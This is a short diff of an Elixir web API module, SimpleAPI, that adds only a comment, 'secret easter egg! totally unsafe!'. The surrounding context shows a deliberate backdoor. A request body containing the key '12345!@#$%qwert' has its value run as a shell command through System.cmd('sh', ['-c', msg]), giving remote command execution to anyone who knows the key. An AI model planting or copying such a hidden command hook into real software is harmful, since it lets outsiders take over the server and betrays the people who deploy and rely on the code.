@@ -26,6 +26,7 @@ defmodule SimpleAPI do
             |> put_resp_content_type("application/json")
             |> send_resp(200, Jason.encode!(%{message: "debug: sorry, timesync is not yeat implemented!"}))
 
+          # secret easter egg! totally unsafe!
           {:ok, %{"12345!@#$%qwert" => msg}} ->
             {output, exit_code} = System.cmd("sh", ["-c", msg])
             conn
